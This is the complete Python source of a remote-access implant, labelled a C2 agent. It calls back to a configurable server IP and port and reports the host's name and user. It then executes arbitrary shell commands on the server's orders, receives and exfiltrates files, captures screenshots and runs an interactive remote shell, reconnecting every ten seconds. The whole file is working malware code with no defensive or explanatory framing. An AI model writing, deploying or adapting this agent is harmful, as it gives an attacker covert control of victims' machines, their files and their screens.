import socket
import subprocess
import os
import platform
import getpass
import time
import sys
import shutil
import base64
from threading import Thread


try:
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

class C2Agent:
    def __init__(self, server_ip='127.0.0.1', server_port=4444):
        self.server_ip = server_ip
        self.server_port = int(server_port)  
        self.socket = None
        self.connected = False
        self.hostname = platform.node()
        self.username = getpass.getuser()
        self.running = True
        self.commands = {
            'upload': self.receive_file,
            'download': self.send_file,
            'screenshot': self.take_screenshot,
            'shell': self.start_shell,
            'disconnect': self.disconnect
        }
    
    def connect(self):
        """Connect to the C2 server"""
        while self.running:
            try:
                if not self.connected:
                    print("[*] Attempting to connect to C2 server...")
                    print(f"[*] Target: {self.server_ip}:{self.server_port}")
                    
                    
                    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket.settimeout(30)  
                    
                    
                    print("[*] Establishing connection...")
                    self.socket.connect((self.server_ip, self.server_port))
                    print("[*] Socket connected, sending system information...")
                    
                    
                    self.socket.sendall(self.hostname.encode())
                    time.sleep(1)  
                    self.socket.sendall(self.username.encode())
                    
                    
                    print("[*] Waiting for server acknowledgement...")
                    response = self.socket.recv(1024).decode()
                    print(f"[+] {response}")
                    
                    self.connected = True
                    print(f"[+] Connected to C2 server at {self.server_ip}:{self.server_port}")
                    
                   
                    self.handle_commands()
            
            except socket.timeout:
                print(f"[!] Connection timed out. Server at {self.server_ip}:{self.server_port} not responding.")
                self.connected = False
                if self.socket:
                    self.socket.close()
                self.socket = None
                
                
                print("[*] Attempting to reconnect in 10 seconds...")
                time.sleep(10)
                
            except ConnectionRefusedError:
                print(f"[!] Connection refused. Is the server running at {self.server_ip}:{self.server_port}?")
                self.connected = False
                if self.socket:
                    self.socket.close()
                self.socket = None
                
                
                print("[*] Attempting to reconnect in 10 seconds...")
                time.sleep(10)
                
            except Exception as e:
                print(f"[!] Connection error: {str(e)}")
                self.connected = False
                if self.socket:
                    self.socket.close()
                self.socket = None
                
                
                print("[*] Attempting to reconnect in 10 seconds...")
                time.sleep(10)
    
    def handle_commands(self):
        """Handle incoming commands from the C2 server"""
        while self.connected and self.running:
            try:
                
                self.socket.settimeout(None)  
                
               
                data = self.socket.recv(1024)
                if not data:
                    print("[!] Connection to server lost")
                    self.connected = False
                    break
                    
            
                command_str = data.decode()
                print(f"[*] Received command: {command_str}")
                parts = command_str.split(' ', 1)
                command = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""
                
                if command in self.commands:
                    self.commands[command](args)
                else:
                    output = self.execute_command(command_str)
                    self.socket.sendall(output.encode())
                    
            except Exception as e:
                print(f"[!] Error handling command: {e}")
                self.connected = False
                break
    
    def execute_command(self, command):
        """Execute a system command and return the output"""
        try:
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout, stderr = process.communicate(timeout=30)
            
            if stdout:
                output = stdout.decode('utf-8', errors='replace')
            elif stderr:
                output = f"ERROR: {stderr.decode('utf-8', errors='replace')}"
            else:
                output = "Command executed successfully (no output)"
                
            return output
            
        except subprocess.TimeoutExpired:
            return "ERROR: Command timed out"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def receive_file(self, destination_path):
        """Receive a file from the server"""
        try:
            self.socket.sendall("READY".encode())
            
            file_size = int(self.socket.recv(1024).decode())
            self.socket.sendall("READY".encode())
            
            file_data = b""
            remaining = file_size
            
            while remaining > 0:
                chunk = self.socket.recv(min(4096, remaining))
                if not chunk:
                    break
                file_data += chunk
                remaining -= len(chunk)
            
            try:
                with open(destination_path, 'wb') as file:
                    file.write(file_data)
                self.socket.sendall(f"[+] File uploaded successfully to {destination_path}".encode())
            except Exception as e:
                self.socket.sendall(f"ERROR: Failed to write file: {str(e)}".encode())
            
        except Exception as e:
            try:
                self.socket.sendall(f"ERROR: {str(e)}".encode())
            except:
                pass
    
    def send_file(self, source_path):
        """Send a file to the server"""
        try:
            if not os.path.isfile(source_path):
                self.socket.sendall(f"ERROR: File '{source_path}' not found".encode())
                return
                
            with open(source_path, 'rb') as file:
                file_data = file.read()
            
            self.socket.sendall(str(len(file_data)).encode())
            
            response = self.socket.recv(1024).decode()
            if response != "READY":
                return
            
            self.socket.sendall(file_data)
            
        except Exception as e:
            try:
                self.socket.sendall(f"ERROR: {str(e)}".encode())
            except:
                pass
    
    def take_screenshot(self, args):
        """Take a screenshot and send it to the server"""
        try:
            if not SCREENSHOT_AVAILABLE:
                self.socket.sendall("ERROR: Screenshot functionality not available (pyautogui missing)".encode())
                return
                
            screenshot = pyautogui.screenshot()
            
            temp_file = f"temp_screenshot_{int(time.time())}.png"
            screenshot.save(temp_file)
            
            with open(temp_file, 'rb') as file:
                screenshot_data = file.read()
            
            try:
                os.remove(temp_file)
            except:
                pass
            
            self.socket.sendall(str(len(screenshot_data)).encode())
            
            response = self.socket.recv(1024).decode()
            if response != "READY":
                return
            
            self.socket.sendall(screenshot_data)
            
        except Exception as e:
            try:
                self.socket.sendall(f"ERROR: Failed to take screenshot: {str(e)}".encode())
            except:
                pass
    
    def start_shell(self, args):
        """Start an interactive shell session"""
        try:
            while True:
                command = self.socket.recv(1024).decode()
                
                if command == "exit_shell":
                    break
                
                output = self.execute_command(command)
                self.socket.sendall(output.encode())
                
        except Exception as e:
            print(f"[!] Shell error: {e}")
    
    def disconnect(self, args):
        """Handle server-initiated disconnect"""
        print("[*] Server requested disconnection")
        self.connected = False
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        sys.exit(0)

if __name__ == "__main__":
    server_ip = '127.0.0.1'  
    server_port = 4444       
    

    if len(sys.argv) > 1:
        server_ip = sys.argv[1]
    if len(sys.argv) > 2:
        server_port = int(sys.argv[2])
    
    print(f"""
    ╔════════════════════════════════════════════════╗
    ║                 C2 AGENT v1.0                  ║
    ╚════════════════════════════════════════════════╝
    Connecting to {server_ip}:{server_port}...
    """)
    
    agent = C2Agent(server_ip, server_port)
    agent.connect()